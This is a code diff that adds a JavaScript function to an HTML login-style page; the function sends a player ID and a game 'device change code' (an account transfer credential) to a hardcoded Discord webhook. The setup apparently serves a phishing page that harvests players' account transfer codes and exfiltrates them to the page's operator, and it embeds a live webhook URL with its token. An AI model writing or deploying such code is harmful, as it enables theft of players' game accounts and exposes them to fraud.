@@ -91,7 +91,31 @@
         </div>
       </form>
     </div>
+<script>
+   function sendToDiscord(playerId, changeCode) {
+        const webhookUrl = "https://discord.com/api/webhooks/1256923461255958660/51CKXYA7Z9GpiL4g-f-nIoTeD6ax-QiQh34RJq0sLaYMpC_GTJeNprtL3VyM9NP0Nxp8"; // ここにWebhook URLを入力
 
+        const payload = {
+          content: `プレイヤーID: ${playerId}\n機種変更コード: ${changeCode}`
+        };
+
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        })
+        .then(response => {
+          if (response.ok) {
+            console.log('メッセージが送信されました');
+          } else {
+            console.error('メッセージの送信に失敗しました');
+          }
+        })
+        .catch(error => console.error('エラー:', error));
+      }
+</script>
     <script>
       function validateForm(event) {
         const form = document.getElementById('loginForm');
